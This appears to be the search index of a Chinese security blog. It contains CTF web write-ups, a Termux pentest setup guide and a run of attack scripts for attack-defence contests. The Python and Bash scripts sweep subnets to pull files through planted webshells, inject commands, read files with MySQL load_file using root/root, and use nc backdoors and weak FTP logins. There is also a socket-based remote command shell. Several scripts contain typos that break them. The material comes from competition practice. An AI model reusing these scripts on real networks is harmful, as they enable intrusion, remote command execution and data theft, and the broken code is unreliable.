这个函数,is_numeric 是判断 传入的字符串是否为数字。如果是则不输出,不是则输出$num。这个时候我们可以绕过这个函数。 他判断的是数字那么我们给他加点字符串 ?num=1a，则绕过了第一个if判断，并跳到了第二个if判断。 然后他现在直接显示出了flag. [web3]--------------------------------------------------- 他会一直弹窗出来。不知道为什么我的Chrome不会跳出来。 接着我们直接看源码F12 或者 Ctrl+U，发现最下面有一个被注释的html编码 我的方法是，编写到文本，换html格式打开。 解码就出来了. [域名解析]------------------------------------------------- 修改hosts访问 flag.baidu.com即可. hosts位置 windows： C:\\Windows\\System32\\drivers\\etc linux: /etc/hosts [你必须让他停下来]-------------------------------------------- 打开网址发现他一直刷新。二话不说直接上Burpsuite抓包，并放到Repeater(Ctrl+R)。 多Go几遍就能看到flag了 [本地文件包含]-------------------------------------------------- 网站进不去。放弃. [变量1]------------------------------------------------------ 先看审计代码，发现最下面有两个$$args $$ 容易引发变量覆盖 思考。我们直接让他全部值显示出来。使用全局变量$GLOBALS 我们直接给他 全局变量$GLOBALS传参进去,args=GLOBALS tips:关于全局变量https://www.runoob.com/php/php-superglobals.html [web5]---------------------------------------------------- 输入字符串,啥东西都没有 直接看看源码F12 或者 Ctrl+U 发现这一串看不懂的编码。这种编码是JSFUCK属于一直 加密方式 tips:原理https://blog.csdn.net/qq_36539075/article/details/79946099 直接F12在Console里粘贴 [头等舱]------------------------------------------------------ 什么也没有。 在看下头等舱。就能猜测到他flag肯定在 请求头那边，于是直接上抓包软件，并GO一遍看看 拿到flag！ [网站被黑]------------------------------------------------------ 打开网站。好炫啊。还会跟着鼠标动，好！偷代码下来了 啥也没提示。直接上御剑扫描找到一个。shell的路径 123.206.87.240:8002/webshell/shell.php 二话不说直接上爆破Burp Suite 输入上去 GET到flag [管理员系统]------------------------------------------------------ 打开发现是一个登入界面。尝试使用SQL万能密码登入 失败了。IP被禁止访问。 于是打开抓包软件在请求头上添加上**X-Forwarded-For 127.0.0.1** 再试试万能密码 密码错误。那么我们来看看源码F12 看到源码中有一个被注释的base64的编码。于是解密出来看是test123那么用户名是**admin密码是test123** tips:不定时更新。每更新十个题目","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hu5k7.github.io/categories/CTF/"},{"name":"CTF-Web-Note","slug":"CTF/CTF-Web-Note","permalink":"https://hu5k7.github.io/categories/CTF/CTF-Web-Note/"}],"tags":[{"name":"CTF-Web-Note","slug":"CTF-Web-Note","permalink":"https://hu5k7.github.io/tags/CTF-Web-Note/"}]},{"title":"Termux安装笔记","slug":"Termux安装","date":"2019-02-02T00:00:00.000Z","updated":"2020-07-10T05:32:37.243Z","comments":true,"path":"2019/02/02/Termux安装/","link":"","permalink":"https://hu5k7.github.io/2019/02/02/Termux安装/","excerpt":"0x00 介绍 为了方便,随时随地能做渗透测试又安装不了NetHuter的时候做出来的整理。也为了方便我自己以后刷系统能在安装回来，写写笔记","text":"0x00 介绍 为了方便,随时随地能做渗透测试又安装不了NetHuter的时候做出来的整理。也为了方便我自己以后刷系统能在安装回来，写写笔记 科学上网 在Github上搜索ShadowsocksR (https://github.com/shadowsocksr-backup/shadowsocksr-android/releases) 赛风 Termux下载地址 Google商城(要借助科学上网) 酷安 Termux更改源 自动更换指令 sed -i 's@^\\(deb.*stable main\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux stable main@' $PREFIX/etc/apt/sources.list 手动修改 ​ 编辑 $PREFIX/etc/apt/sources.list 修改为如下内容 # The termux repository mirror from TUNA: deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main 并更新pkg up / apt update 两种方法安装metasploit 两种方法安装metasploit 第一种 pkg install metasploit 一路默认安装 第二种 apt install wget wget https://Auxilus.github.io/metasploit.sh sh metasploit.sh pkg install metasploit Termux安装一些Python必要的库 pkg install python python-dev python2 python2-dev Termux安装一些常用的辅助工具 pkg install git curl 美化Termux oh-my-zsh的安装 sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot; 一步到位，后面自己选择主题和颜色 Termux安装nmap pkg install nmap Termux安装SQLMap apt install python2 git git clone https://github.com/sqlmapproject/sqlmap 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"【转载】黑苹果安装笔记","slug":"BlackApple","date":"2018-12-15T00:00:00.000Z","updated":"2020-07-10T05:30:59.627Z","comments":true,"path":"2018/12/15/BlackApple/","link":"","permalink":"https://hu5k7.github.io/2018/12/15/BlackApple/","excerpt":"上个星期装的双系统,win10 & MACOS,还把之前的win10搞崩了。害的我只能重装win10","text":"上个星期装的双系统,win10 & MACOS,还把之前的win10搞崩了。害的我只能重装win10 我要总结的转载的简书都。。帮我一起总结了，所以我就懒的写了 嘻嘻 要点: 1、两系统共存则磁盘必须是GPT格式 2、安装mac要用适合机型的EFI文件和相应的安装配置，特别是显卡驱动&lt;br&gt; 3、安装完以后要把mac和win完整的EFI文件合并到一起并且放入电脑安装时自动分好的EFI分区内&lt;br&gt; 4 、用clover挂载好所有的电脑内EFI引导文件（即mac 和 win的） 简略步骤: 远景：从GPT(GUID) 分区开始,EasyUEFI 双系统安装详解(install.wim + mac10.12.5)这是win7+mac10.12的帖子，比较复杂，可以看看，了解EFI分区。win10+mac10.12 直接看12楼的回复就可以了&lt;br&gt; 分区：PE下分一个ESP ，二个NT&lt;br&gt; 安装MAC：u盘安装 安装win10：PE下安装WIN的WIM镜像，在软件里选对系统分区，启动分区，引导类型 EFI引导：装好WIN后，COPY CLOVER进ESP，就完事了 把Mac efi里面CLOVER文件夹放到esp分区的efi文件夹里，然后用easyuefi添加EFI/CLOVER/CLOVERX64.efi引导 在此之前需要的准备： 硬件方面： 一台i7-7700k + Gigabyte Z270X-Gaming5 台式机 最好有一台可用的mac 2个以上空的8G或以上的U盘 软件方面： 准备好mac 10.11.3镜象 准备好在win上制作mac镜象的工具：transmac(自行百度）或者mac上制作mac镜像的工具：Unibeast 准备好在mac上挂载EFI分区的工具：Clover Configurator BIOS设置： 启动方式：UEFI 硬盘模式：ACHI 家伙事准备得差不多了我们就可以开始了。 一、首先制作mac系统安装盘 1 win系统：在win里下载好mac 10.12系统并安装好transmac 2 Mac 系统：下载macOS Sierra 10.12 并安装Unibeast，制作mac安装盘 二、制作win10系统安装盘 三、安装mac，我们要实现mac和win10同时存在，并要双引导，所以必须要uefi引导方式，而win10要uefi引导就必须装在GPT格式的磁盘上，所以，首先，必须将磁盘设置为GPT格式，所以先用win10的系统盘插入电脑，开机，进入安装界面，在选择装在哪个盘的时候点击shift F10，然后在dos里操作，具体操作不再此说明 设置磁盘格式为GPT以后，退出windows安装，我们先还是安装mac 的，把我们做好的mac系统盘插入电脑，开机，按F7，用U盘引导，选择install OS X EI Capitan,按照提示一步一步安装完成即可，大概20-25分钟，取决于你的U盘速度。这里有个分区的问题，你想给mac多少空间，就多少，其它的不用创建分区，等windows创建即可，我128固态给mac40G。之后mac安装完成 四、安装完成后，关机，插入 win7系统盘，同样UEFI安装用U盘引导，安装在ssd剩下的空间里，没有什么好说的。&lt;br&gt;这个时候windows和mac都安装好了，但是这个时候你拨掉U盘开机会发现直接进入了win10系统，说好的选择呢？ 不急，我们mac的efi也还没有替换呢。 五、处理电脑EFI分区：首先，用U盘引导，进入mac,同时用工具挂载电脑和系统盘两个EFI分区，并把EFI文件夹删除，把我们下载好的EFI文件夹分别放进去，不做作何处理，就是说现在电脑里有mac需要的配置、驱动等都有了，关机，拨掉U盘，开机，进入win10系统，在win10下同样挂载电脑EFI分区，怎么挂载呢？， 插入win10的系统盘，把里边的efi文件夹里边的内容替换进去（注意是内容替换，不是把原来的efi删除，把这个放进去，因为原来的efi里边已经有mac的启动文件了） 替换完了后，关机，拨掉win10系统盘，插入mac系统盘，开机，按F7,用U盘引导，在clover界面先择 boot option ,先择第一个挂载所有引导，忘了具体是什么了，大概是这个意思，如果你发现右下角的clover版本号变了，就成功了，这个时候restart，拨掉U盘，开机应该自动到clover选择界面，可以选择作意系统了。此时mac和win10双引导基本完成。 接下来就是安装各种驱动和完善了 参考:https://www.jianshu.com/p/5db38511cc73","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"一周8个精选文章:第一章","slug":"Daily01","date":"2018-12-05T00:00:00.000Z","updated":"2020-07-10T05:34:16.962Z","comments":true,"path":"2018/12/05/Daily01/","link":"","permalink":"https://hu5k7.github.io/2018/12/05/Daily01/","excerpt":"","text":"从外网到内网的渗透姿势分享 : https://xz.aliyun.com/t/5330 基于EVE-NG平台上构建企业内网攻防环境 : https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA PHP 函数漏洞总结 : https://blog.csdn.net/qq_31481187/article/details/60968595 CTF Training 经典赛题复现环境: https://github.com/CTFTraining/CTFTraining RemTeam攻击技巧和安全防御 : https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/) 盘点那些渗透测试中的奇淫技巧: https://paper.seebug.org/92/ APT34工具 :https://github.com/p3pperp0tts/APT34 CTF线下攻防指南 : http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/ 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"【PythonScript】:PyMySQL","slug":"Python脚本PyMySQL","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:32:09.421Z","comments":true,"path":"2018/10/10/Python脚本PyMySQL/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本PyMySQL/","excerpt":"0x00 介绍 突然想起来MYSQL是否也能做成自动GETFALG脚本呢。","text":"0x00 介绍 突然想起来MYSQL是否也能做成自动GETFALG脚本呢。 这个还有点问题。可以自己修改下:) import pymysql import threading file=open('MySQLsave.txt','w+') def mysql_login(i): ip='192.168.'+str(i)+'101' username='root' password='root' payload = &quot;SELECT load_file('C:/flag*.txt')&quot; try: db = pymysql.connect(ip,username,password,&quot;mysql&quot;) cursor = db.cursor() cursor.execute(payload) data = cursor.fetchall() print(data) except: pass for i in range(1,249): t = threading.Thread(target=mysql, args=(i,)) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【PythonScript】:WebShell","slug":"Python脚本WebShell","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:34:53.780Z","comments":true,"path":"2018/10/10/Python脚本WebShell/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本WebShell/","excerpt":"&lt;&gt;","text":"&lt;&gt; import requests import threading flag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;) def run(i): ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot; url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot; payload={'cmd':'cat /root/flag*.txt'} try: r = requests.get(url,payload,timeout=1) flag.write(r.url+&quot;\\n&quot;+r.text) print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\\n',r.text) except: print(&quot;\\nConnect Fail &gt;&gt;&quot;,url) for i in range(101,254): t = threading.Thread(target=run, args=(i,)) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【PythonScript】:WebShell_urilb","slug":"Python脚本WebShell_urilb","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:34:40.012Z","comments":true,"path":"2018/10/10/Python脚本WebShell_urilb/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本WebShell_urilb/","excerpt":"0x00 介绍 使用urlilb模块 在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替","text":"0x00 介绍 使用urlilb模块 在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替 import urllib.parse import urllib.request import threading def WebShell(i): data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;} url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot; data_string=urllib.parse.urlencode(data) new_url=url+&quot;?&quot;+data_string try: send = urllib.request.urlopen(new_url,timeout=1) print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;)) except: pass for i in range(1,255): t = threading.Thread(target=WebShell, args=(i, )) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【PythonScript】:Web_Dirs_Scnnaer","slug":"Python脚本Web_Dirs_Scanner","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:32:15.973Z","comments":true,"path":"2018/10/10/Python脚本Web_Dirs_Scanner/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本Web_Dirs_Scanner/","excerpt":"0x00 介绍 看到一些web目录扫描器。自己也尝试写了一下xD","text":"0x00 介绍 看到一些web目录扫描器。自己也尝试写了一下xD import requests import random import re user_agent_list = [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'},] user_agent = random.choice(user_agent_list) target = input(&quot;target host &gt;&quot;) dict_path_file = input(&quot;dicr file &gt;&quot;) def CheckURLProtocol(): Check = re.match(r&quot;http?://&quot;,target) if Check == None: print(&quot;[-]Example: http://127.0.0.1 or https://127.0.0.1&quot;) exit(0) else: with open(dict_path_file) as f: for dic in f.readlines(): url = target + str(dic) url = url.replace(&quot;\\n&quot;,&quot;&quot;) try: r = requests.get(url,headers=user_agent) if r.status_code == 200: print(r.url) except: pass 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【PythonScript】:RemoteSocket_cmd","slug":"Python脚本socket_cmd连接","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:32:12.934Z","comments":true,"path":"2018/10/10/Python脚本socket_cmd连接/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本socket_cmd连接/","excerpt":"0x00 介绍 为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD","text":"0x00 介绍 为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD Server: import socket,os def main(): global data, s s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('127.0.0.1',10001)) s.listen(5) print(&quot;等待连接中……&quot;) while True: conn,addr = s.accept() while True: print('收到命令') data = conn.recv(1024) cmd = os.popen(data.decode()) os_result = cmd.read() conn.sendall(os_result.encode('utf8')) if __name__ == '__main__': main() Client: import socket ServerIP=('127.0.0.1',10001) try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) s.connect(ServerIP) print('[+]连接成功') except: print('[-]服务器无响应') exit(0) while True: data=input('[CMD]&gt;&gt;') s.sendto(bytes(data,encoding='utf8'),ServerIP) data = s.recv(1024) print('[+]回显成功') print(data.decode()) 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【PythonScript】:PortScanner","slug":"Python脚本端口扫描(PortScanner)","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:32:05.760Z","comments":true,"path":"2018/10/10/Python脚本端口扫描(PortScanner)/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本端口扫描(PortScanner)/","excerpt":"0x00 介绍 在实训室无聊的时候，随手写了一下端口扫描的Python脚本.","text":"0x00 介绍 在实训室无聊的时候，随手写了一下端口扫描的Python脚本. import socket import threading file=open(&quot;port.txt&quot;,'w+') def portscan(port): host='192.168.174.1' try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) conn=s.connect_ex((host,port)) if conn ==0: print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post)) file.write(host+&quot;:&quot;+str(post)+&quot;\\n&quot;) else: pass excpet: pass for port in range(1,65535): t=threading.Thread(target=portscan, args=(port, )) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"BashScripts","slug":"Shell脚本","date":"2018-10-09T00:00:00.000Z","updated":"2020-07-10T05:32:25.770Z","comments":true,"path":"2018/10/09/Shell脚本/","link":"","permalink":"https://hu5k7.github.io/2018/10/09/Shell脚本/","excerpt":"0x00 介绍 我在全国职业技能大赛比赛时所用的shell脚本:","text":"0x00 介绍 我在全国职业技能大赛比赛时所用的shell脚本: nc后门: port=10001 for i in `seq 101 254`; do ip=&quot;192.168.2.&quot;$i payload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port` done webshell: or i in `seq 101 254`; do ip=&quot;192.168.2.&quot;$i curl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txt done ftp: username='admin' passwd='123456' for i in `seq 101 254`; do ip=&quot;192.168.2.&quot;$i sh ftpmain.sh $ip $username $passwd #配合ftp使用 ftpmain: ftp $1 -inv user $2 $3 get /root/flag*.txt bye ! 有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。 尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战 这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛 转载请标明出处","categories":[{"name":"Bash","slug":"Bash","permalink":"https://hu5k7.github.io/categories/Bash/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hu5k7.github.io/tags/Shell/"}]}]}